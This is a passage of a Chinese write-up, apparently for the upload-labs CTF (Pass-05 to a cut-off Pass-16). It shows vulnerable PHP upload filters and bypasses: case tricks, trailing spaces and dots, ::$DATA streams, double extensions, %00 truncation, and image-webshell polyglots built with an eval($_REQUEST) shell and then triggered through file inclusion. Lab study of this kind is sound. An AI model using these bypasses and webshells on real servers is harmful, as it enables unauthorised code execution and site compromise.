+</code></pre>
+<p>创建a.jpg</p>
+<pre><code class="language-php">&lt;?php
+	phpinfo()    
+?&gt;
+</code></pre>
+<h3 id="访问readmephp">访问readme.php</h3>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-05readme.php.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-06">Pass-06</h2>
+<blockquote>
+<p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="大小写绕过黑名单">大小写绕过黑名单</h3>
+<p>本题没有使用&quot;strtolower&quot;进行大小写转换,所以将a.php改为a.Php,上传webshell即可</p>
+<br>
+<h2 id="pass-07">Pass-07</h2>
+<blockquote>
+<p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = $_FILES['upload_file']['name'];
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file,$img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="空格绕过">空格绕过</h3>
+<p>本题没有使用&quot;trim&quot;进行删除文件名的前后空格,所以可以使用空格进行绕过</p>
+<h3 id="抓取数据包并修改数据-2">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-07Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<h3 id="注意">注意</h3>
+<p>本题环境适用在Windows环境下,Linux可能无法能正确访问最终结果,在Windows下使用空格命名,Windows会自动删除空格</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Windows%E4%BD%BF%E7%94%A8%E7%A9%BA%E6%A0%BC%E5%91%BD%E5%90%8D.gif" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-08">Pass-08</h2>
+<blockquote>
+<p>本pass禁止上传所有可以解析的后缀！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="句号绕过">句号(.)绕过</h3>
+<p>本题没有使用&quot;deldot&quot;进行删除文件名末尾的句号,所以可以使用句号进行绕过</p>
+<h3 id="抓取数据包并修改数据-3">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-08Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<h3 id="注意-2">注意</h3>
+<p>本题环境适用在Windows环境下,Linux可能无法能正确访问最终结果,在Windows下使用句号命名,Windows会自动删除句号,注意是英文状态下的句号,本题方法与第七题大同小异</p>
+<br>
+<h2 id="pass-09">Pass-09</h2>
+<blockquote>
+<p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<blockquote>
+<p>NTFS文件系统的ADS:https://www.qingsword.com/qing/812.html</p>
+</blockquote>
+<h3 id="data绕过">::$DATA绕过</h3>
+<p>没有对<code>::$DATA</code>进行过滤,所以可以通过::$DATA进行绕过</p>
+<h3 id="抓取数据包并修改数据-4">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-09burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<h3 id="访问">访问</h3>
+<pre><code class="language-hrml">访问的时候将会出现403的情况,只要将Url的::$data去掉即可(上传的文件名字不存在::$data)
+原Url:http://192.168.78.101/upload/upload/202007191638081519.php::$data
+新Url:http://192.168.78.101/upload/upload/202007191638081519.php
+
+</code></pre>
+<h3 id="注意-3">注意</h3>
+<p>本题环境适用在Windows环境且文件系统是NTFS下,Linux可能无法能正确访问最终结果,在Windows的NTFS文件系统有一个特性,NTFS文件系统的数据存储<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">流</mi><mo separator="true">,</mo><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">子</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">“</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">”</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">实</mi><mi mathvariant="normal">际</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">‘</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA数据流,我们写的例子是`“a.php”`，我们在实际写入的是`a.php::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">流</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span><span class="mord">“</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord">”</span><span class="mord">‘</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">际</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA`(数据流名称为空,两个冒号之间为名称位置)</p>
+<br>
+<h2 id="pass-10">Pass-10</h2>
+<blockquote>
+<p>本pass只允许上传.jpg|.png|.gif后缀的文件！</p>
+</blockquote>
+<pre><code class="language-shell">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="利用-句号-空格-句号绕过">利用<code>. .</code>(句号 空格 句号)绕过</h3>
+<p>虽然题目代码进行了&quot;deldot&quot;和&quot;trim&quot;对文件名结尾做了过滤,但是由于只执行一次,所以配合<code>. .</code>上传过滤后,Url解析变成了Pass-08一样,文件后缀变成<code>.php.</code></p>
+<h3 id="抓取数据包并修改数据-5">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-10Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-11">Pass-11</h2>
+<blockquote>
+<p>本pass会从文件名中去除.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);
+
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH.'/'.$file_name;        
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="双写后缀进行绕过">双写后缀进行绕过</h3>
+<p>本题核心代码为</p>
+<pre><code class="language-php">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+</code></pre>
+<p>且代码只会执行一次,所以可以进行双写来绕过第一次替换,比如<code>&quot;.pphphp&quot;</code>,经过程序执行后,将变为<code>.php</code></p>
+<h3 id="抓取数据包并修改数据-6">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-11Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-12">Pass-12</h2>
+<blockquote>
+<p>本pass上传路径可控！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else{
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
+}
+</code></pre>
+<blockquote>
+<p>这个漏洞满足条件:</p>
+<ol>
+<li>PHP版本&lt;5.3.4</li>
+<li>PHP的magic_quotes_gpc必须为Off的状态(默认开启!!!)</li>
+</ol>
+<p>这个漏洞基本淘汰了~</p>
+</blockquote>
+<h3 id="00截断绕过">%00截断绕过</h3>
+<p>程序读字符读到%00 后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p>
+<pre><code class="language-php">本题关键在于路径
+正常上传的路径为:
+../upload/xxxjpg
+但我们构造payload的上传路径为:
+../upload/1.php%00xxx.jpg
+这个时候程序就会执行%00截断,文件成为1.php
+</code></pre>
+<h3 id="抓取数据包并修改数据-7">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-12burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-13">Pass-13</h2>
+<blockquote>
+<p>本pass上传路径可控！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传失败&quot;;
+        }
+    } else {
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
+}
+</code></pre>
+<h3 id="00截断绕过-2">%00截断绕过</h3>
+<p>本题与Pass-12类似,只不过请求方法由GET变成POST,这个时候就要注意由于GET请求时会进行urldecode,而POST请求时不会进行urldecode所以需要手动进行urldecode</p>
+<h3 id="抓取数据包并修改数据-8">抓取数据包并修改数据</h3>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-13burp%E6%8A%93%E5%8C%85.gif" alt="" loading="lazy"></figure>
+<blockquote>
+<p>文件名后缀.php1,这里将1的十六进制的值31改为00</p>
+</blockquote>
+<br>
+<h2 id="pass-14">Pass-14</h2>
+<blockquote>
+<p>本pass检查图标内容开头2个字节！</p>
+</blockquote>
+<pre><code class="language-php">function getReailFileType($filename){
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
+    $fileType = '';    
+    switch($typeCode){      
+        case 255216:            
+            $fileType = 'jpg';
+            break;
+        case 13780:            
+            $fileType = 'png';
+            break;        
+        case 7173:            
+            $fileType = 'gif';
+            break;
+        default:            
+            $fileType = 'unknown';
+        }    
+        return $fileType;
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_type = getReailFileType($temp_file);
+
+    if($file_type == 'unknown'){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+</code></pre>
+<h3 id="图马制作">图马制作</h3>
+<p>本题用检测内容的方式进行验证,且有文件包含的漏洞,所以用图马+文件包含来执行漏洞</p>
+<blockquote>
+<p>准备一张jpg、png或者gif图片</p>
+<p>准备一个php WebShell</p>
+</blockquote>
+<pre><code class="language-powershell">图片 大了一岁.jpg
+WebShell:
+&lt;?php
+	phpinfo();
+    @eval($_REQUEST[&quot;shell&quot;]);
+?&gt;
+
+图马制作命令(Windows环境)
+
+copy 大了一岁.jpg + a.php b.php
+
+
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E5%9B%BE%E9%A9%AC%E5%88%B6%E4%BD%9C.png" alt="" loading="lazy"></figure>
+<h3 id="文件包含">文件包含</h3>
+<p>靶机已经提供了文件包含漏洞的网页文件,访问即可</p>
+<pre><code class="language-powershell">http://192.168.78.101/upload/include.php?file=upload/xxx(上传后的文件名).jpg
+</code></pre>
+<br>
+<h2 id="pass-15">Pass-15</h2>
+<blockquote>
+<p>本pass使用getimagesize()检查是否为图片文件！</p>
+</blockquote>
+<pre><code class="language-php">function isImage($filename){
+    $types = '.jpeg|.png|.gif';
+    if(file_exists($filename)){
+        $info = getimagesize($filename);
+        $ext = image_type_to_extension($info[2]);
+        if(stripos($types,$ext)&gt;=0){
+            return $ext;
+        }else{
+            return false;
+        }
+    }else{
+        return false;
+    }
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $res = isImage($temp_file);
+    if(!$res){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+</code></pre>
+<h3 id="图马制作-2">图马制作</h3>
+<pre><code class="language-powershell">做gif的马
+
+GIF89a
+
+&lt;?php
+     phpinfo();
+    @eval($_REQUEST[&quot;shell&quot;]);
+?&gt;
+
+保存.gif的后缀
+
+</code></pre>
+<h3 id="文件包含-2">文件包含</h3>
+<p>上传,文件包含访问执行代码</p>
+<pre><code class="language-powershell">http://192.168.78.101/upload/include.php?file=upload/xxx(上传后的文件名).gif
+</code></pre>
+<br>
+<h2 id="pass-16">Pass-16</h2>
+<blockquote>
+<p>本pass使用exif_imagetype()检查是否为图片文件！</p>
+</blockquote>
+<pre><code class="language-php">function isImage($filename){
+    //需要开启php_exif模块
+    $image_type = exif_imagetype($filename);
+    switch ($image_type) {
+        case IMAGETYPE_GIF:
+            return &quot;gif&quot;;
+            break;
+        case IMAGETYPE_JPEG:
+            return &quot;jpg&quot;;
+            break;
+        case IMAGETYPE_PNG:
+            return &quot;png&quot;;
+            break;    
+        default:
+            return false;
+            break;
+    }
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $res = isImage($temp_file);
